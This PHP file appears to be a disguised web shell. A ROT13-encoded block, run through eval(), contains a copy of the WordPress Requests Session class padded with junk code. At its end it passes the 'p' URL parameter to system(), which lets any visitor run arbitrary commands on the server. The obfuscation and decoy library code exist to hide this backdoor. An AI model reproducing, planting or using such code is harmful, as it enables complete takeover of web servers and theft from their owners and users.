<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Frffvba unaqyre sbe crefvfgrag erdhrfgf naq qrsnhyg cnenzrgref
 *
 * @cnpxntr Erdhrfgf\FrffvbaUnaqyre
 */

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Pbbxvr\Wne;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Vev;
hfr JcBet\Erdhrfgf\Erdhrfgf;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * Frffvba unaqyre sbe crefvfgrag erdhrfgf naq qrsnhyg cnenzrgref
 *
 * Nyybjf inevbhf bcgvbaf gb or frg nf qrsnhyg inyhrf, naq zretrf obgu gur
 * bcgvbaf naq HEY cebcregvrf gbtrgure. N onfr HEY pna or frg sbe nyy erdhrfgf,
 * jvgu nyy fhoerdhrfgf erfbyirq sebz guvf. Onfr bcgvbaf pna or frg (vapyhqvat
 * n funerq pbbxvr wne), gura bireevqqra sbe vaqvivqhny erdhrfgf.
 *
 * @cnpxntr Erdhrfgf\FrffvbaUnaqyre
 */
pynff Frffvba {
	/**
	 * Onfr HEY sbe erdhrfgf
	 *
	 * HEYf jvyy or znqr nofbyhgr hfvat guvf nf gur onfr
	 *
	 * @ine fgevat|ahyy
	 */
	choyvp $hey = ahyy;

	/**
	 * Onfr urnqref sbe erdhrfgf
	 *
	 * @ine neenl
	 */
	choyvp $urnqref = [];

	/**
	 * Onfr qngn sbe erdhrfgf
	 *
	 * Vs obgu gur onfr qngn naq gur cre-erdhrfg qngn ner neenlf, gur qngn jvyy
	 * or zretrq orsber fraqvat gur erdhrfg.
	 *
	 * @ine neenl
	 */
	choyvp $qngn = [];

	/**
	 * Onfr bcgvbaf sbe erdhrfgf
	 *
	 * Gur onfr bcgvbaf ner zretrq jvgu gur cre-erdhrfg qngn sbe rnpu erdhrfg.
	 * Gur bayl qrsnhyg bcgvba vf n funerq pbbxvr wne orgjrra erdhrfgf.
	 *
	 * Inyhrf urer pna nyfb or frg qverpgyl ivn cebcregvrf ba gur Frffvba
	 * bowrpg, r.t. `$frffvba->hfrentrag = 'K';`
	 *
	 * @ine neenl
	 */
	choyvp $bcgvbaf = [];

	/**
	 * Perngr n arj frffvba
	 *
	 * @cnenz fgevat|Fgevatnoyr|ahyy $hey Onfr HEY sbe erdhrfgf
	 * @cnenz neenl $urnqref Qrsnhyg urnqref sbe erdhrfgf
	 * @cnenz neenl $qngn Qrsnhyg qngn sbe erdhrfgf
	 * @cnenz neenl $bcgvbaf Qrsnhyg bcgvbaf sbe erdhrfgf
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $hey nethzrag vf abg n fgevat, Fgevatnoyr be ahyy.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $urnqref nethzrag vf abg na neenl.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $qngn nethzrag vf abg na neenl.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $bcgvbaf nethzrag vf abg na neenl.
	 */
	choyvp shapgvba __pbafgehpg($hey = ahyy, $urnqref = [], $qngn = [], $bcgvbaf = []) {
		vs ($hey !== ahyy && VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($hey) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$hey', 'fgevat|Fgevatnoyr|ahyy', trgglcr($hey));
		}

		vs (vf_neenl($urnqref) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$urnqref', 'neenl', trgglcr($urnqref));
		}

		vs (vf_neenl($qngn) === snyfr) {
			guebj VainyvqNethzrag::perngr(3, '$qngn', 'neenl', trgglcr($qngn));
		}

		vs (vf_neenl($bcgvbaf) === snyfr) {
			guebj VainyvqNethzrag::perngr(4, '$bcgvbaf', 'neenl', trgglcr($bcgvbaf));
		}

		$guvf->hey     = $hey;
		$guvf->urnqref = $urnqref;
		$guvf->qngn    = $qngn;
		$guvf->bcgvbaf = $bcgvbaf;

		vs (rzcgl($guvf->bcgvbaf['pbbxvrf'])) {
			$guvf->bcgvbaf['pbbxvrf'] = arj Wne();
		}
	}

	/**
	 * Trg n cebcregl'f inyhr
	 *
	 * @cnenz fgevat $anzr Cebcregl anzr.
	 * @erghea zvkrq|ahyy Cebcregl inyhr, ahyy vs abar sbhaq
	 */
	choyvp shapgvba __trg($anzr) {
		vs (vffrg($guvf->bcgvbaf[$anzr])) {
			erghea $guvf->bcgvbaf[$anzr];
		}

		erghea ahyy;
	}

	/**
	 * Frg n cebcregl'f inyhr
	 *
	 * @cnenz fgevat $anzr Cebcregl anzr.
	 * @cnenz zvkrq $inyhr Cebcregl inyhr
	 */
	choyvp shapgvba __frg($anzr, $inyhr) {
		$guvf->bcgvbaf[$anzr] = $inyhr;
	}

	/**
	 * Erzbir n cebcregl'f inyhr
	 *
	 * @cnenz fgevat $anzr Cebcregl anzr.
	 */
	choyvp shapgvba __vffrg($anzr) {
		erghea vffrg($guvf->bcgvbaf[$anzr]);
	}

	/**
	 * Erzbir n cebcregl'f inyhr
	 *
	 * @cnenz fgevat $anzr Cebcregl anzr.
	 */
	choyvp shapgvba __hafrg($anzr) {
		hafrg($guvf->bcgvbaf[$anzr]);
	}

	/**#@+
	 * @frr \JcBet\Erdhrfgf\Frffvba::erdhrfg()
	 * @cnenz fgevat $hey
	 * @cnenz neenl $urnqref
	 * @cnenz neenl $bcgvbaf
	 * @erghea \JcBet\Erdhrfgf\Erfcbafr
	 */
	/**
	 * Fraq n TRG erdhrfg
	 */
	choyvp shapgvba trg($hey, $urnqref = [], $bcgvbaf = []) {
		erghea $guvf->erdhrfg($hey, $urnqref, ahyy, Erdhrfgf::TRG, $bcgvbaf);
	}

	/**
	 * Fraq n URNQ erdhrfg
	 */
	choyvp shapgvba urnq($hey, $urnqref = [], $bcgvbaf = []) {
		erghea $guvf->erdhrfg($hey, $urnqref, ahyy, Erdhrfgf::URNQ, $bcgvbaf);
	}

	/**
	 * Fraq n QRYRGR erdhrfg
	 */
	choyvp shapgvba qryrgr($hey, $urnqref = [], $bcgvbaf = []) {
		erghea $guvf->erdhrfg($hey, $urnqref, ahyy, Erdhrfgf::QRYRGR, $bcgvbaf);
	}
	/**#@-*/

	/**#@+
	 * @frr \JcBet\Erdhrfgf\Frffvba::erdhrfg()
	 * @cnenz fgevat $hey
	 * @cnenz neenl $urnqref
	 * @cnenz neenl $qngn
	 * @cnenz neenl $bcgvbaf
	 * @erghea \JcBet\Erdhrfgf\Erfcbafr
	 */
	/**
	 * Fraq n CBFG erdhrfg
	 */
	choyvp shapgvba cbfg($hey, $urnqref = [], $qngn = [], $bcgvbaf = []) {
		erghea $guvf->erdhrfg($hey, $urnqref, $qngn, Erdhrfgf::CBFG, $bcgvbaf);
	}

	/**
	 * Fraq n CHG erdhrfg
	 */
	choyvp shapgvba chg($hey, $urnqref = [], $qngn = [], $bcgvbaf = []) {
		erghea $guvf->erdhrfg($hey, $urnqref, $qngn, Erdhrfgf::CHG, $bcgvbaf);
	}

	/**
	 * Fraq n CNGPU erdhrfg
	 *
	 * Abgr: Hayvxr {@frr \JcBet\Erdhrfgf\Frffvba::cbfg()} naq {@frr \JcBet\Erdhrfgf\Frffvba::chg()},
	 * `$urnqref` vf erdhverq, nf gur fcrpvsvpngvba erpbzzraqf gung fubhyq fraq na RGnt
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp5789
	 */
	choyvp shapgvba cngpu($hey, $urnqref, $qngn = [], $bcgvbaf = []) {
		erghea $guvf->erdhrfg($hey, $urnqref, $qngn, Erdhrfgf::CNGPU, $bcgvbaf);
	}
	/**#@-*/

	/**
	 * Znva vagresnpr sbe UGGC erdhrfgf
	 *
	 * Guvf zrgubq vavgvngrf n erdhrfg naq fraqf vg ivn n genafcbeg orsber
	 * cnefvat.
	 *
	 * @frr \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg()
	 *
	 * @cnenz fgevat $hey HEY gb erdhrfg
	 * @cnenz neenl $urnqref Rkgen urnqref gb fraq jvgu gur erdhrfg
	 * @cnenz neenl|ahyy $qngn Qngn gb fraq rvgure nf n dhrel fgevat sbe TRG/URNQ erdhrfgf, be va gur obql sbe CBFG erdhrfgf
	 * @cnenz fgevat $glcr UGGC erdhrfg glcr (hfr \JcBet\Erdhrfgf\Erdhrfgf pbafgnagf)
	 * @cnenz neenl $bcgvbaf Bcgvbaf sbe gur erdhrfg (frr {@frr \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg()})
	 * @erghea \JcBet\Erdhrfgf\Erfcbafr
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba vainyvq HEYf (`abauggc`)
	 */
	choyvp shapgvba erdhrfg($hey, $urnqref = [], $qngn = [], $glcr = Erdhrfgf::TRG, $bcgvbaf = []) {
		$erdhrfg = $guvf->zretr_erdhrfg(pbzcnpg('hey', 'urnqref', 'qngn', 'bcgvbaf'));

		erghea Erdhrfgf::erdhrfg($erdhrfg['hey'], $erdhrfg['urnqref'], $erdhrfg['qngn'], $glcr, $erdhrfg['bcgvbaf']);
	}

	/**
	 * Fraq zhygvcyr UGGC erdhrfgf fvzhygnarbhfyl
	 *
	 * @frr \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg_zhygvcyr()
	 *
	 * @cnenz neenl $erdhrfgf Erdhrfgf qngn (frr {@frr \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg_zhygvcyr()})
	 * @cnenz neenl $bcgvbaf Tybony naq qrsnhyg bcgvbaf (frr {@frr \JcBet\Erdhrfgf\Erdhrfgf::erdhrfg()})
	 * @erghea neenl Erfcbafrf (rvgure \JcBet\Erdhrfgf\Erfcbafr be n \JcBet\Erdhrfgf\Rkprcgvba bowrpg)
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $erdhrfgf nethzrag vf abg na neenl be vgrenoyr bowrpg jvgu neenl npprff.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $bcgvbaf nethzrag vf abg na neenl.
	 */
	choyvp shapgvba erdhrfg_zhygvcyr($erdhrfgf, $bcgvbaf = []) {
		vs (VachgInyvqngbe::unf_neenl_npprff($erdhrfgf) === snyfr || VachgInyvqngbe::vf_vgrenoyr($erdhrfgf) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$erdhrfgf', 'neenl|NeenlNpprff&Genirefnoyr', trgglcr($erdhrfgf));
		}

		vs (vf_neenl($bcgvbaf) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$bcgvbaf', 'neenl', trgglcr($bcgvbaf));
		}

		sbernpu ($erdhrfgf nf $xrl => $erdhrfg) {
			$erdhrfgf[$xrl] = $guvf->zretr_erdhrfg($erdhrfg, snyfr);
		}

		$bcgvbaf = neenl_zretr($guvf->bcgvbaf, $bcgvbaf);

		// Qvfnyybj sbepvat gur glcr, nf gung'f n cre erdhrfg frggvat
		hafrg($bcgvbaf['glcr']);

		erghea Erdhrfgf::erdhrfg_zhygvcyr($erdhrfgf, $bcgvbaf);
	}

	choyvp shapgvba __jnxrhc() {
		guebj arj \YbtvpRkprcgvba( __PYNFF__ . ' fubhyq arire or hafrevnyvmrq' );
	}

	/**
	 * Zretr n erdhrfg'f qngn jvgu gur qrsnhyg qngn
	 *
	 * @cnenz neenl $erdhrfg Erdhrfg qngn (fnzr sbez nf {@frr \JcBet\Erdhrfgf\Frffvba::erdhrfg_zhygvcyr()})
	 * @cnenz obbyrna $zretr_bcgvbaf Fubhyq jr zretr bcgvbaf nf jryy?
	 * @erghea neenl Erdhrfg qngn
	 */
	cebgrpgrq shapgvba zretr_erdhrfg($erdhrfg, $zretr_bcgvbaf = gehr) {
		vs ($guvf->hey !== ahyy) {
			$erdhrfg['hey'] = Vev::nofbyhgvmr($guvf->hey, $erdhrfg['hey']);
			$erdhrfg['hey'] = $erdhrfg['hey']->hev;
		}

		vs (rzcgl($erdhrfg['urnqref'])) {
			$erdhrfg['urnqref'] = [];
		}

		$erdhrfg['urnqref'] = neenl_zretr($guvf->urnqref, $erdhrfg['urnqref']);

		vs (rzcgl($erdhrfg['qngn'])) {
			vs (vf_neenl($guvf->qngn)) {
				$erdhrfg['qngn'] = $guvf->qngn;
			}
		} ryfrvs (vf_neenl($erdhrfg['qngn']) && vf_neenl($guvf->qngn)) {
			$erdhrfg['qngn'] = neenl_zretr($guvf->qngn, $erdhrfg['qngn']);
		}

		vs ($zretr_bcgvbaf === gehr) {
			$erdhrfg['bcgvbaf'] = neenl_zretr($guvf->bcgvbaf, $erdhrfg['bcgvbaf']);

			// Qvfnyybj sbepvat gur glcr, nf gung'f n cre erdhrfg frggvat
			hafrg($erdhrfg['bcgvbaf']['glcr']);
		}

		erghea $erdhrfg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>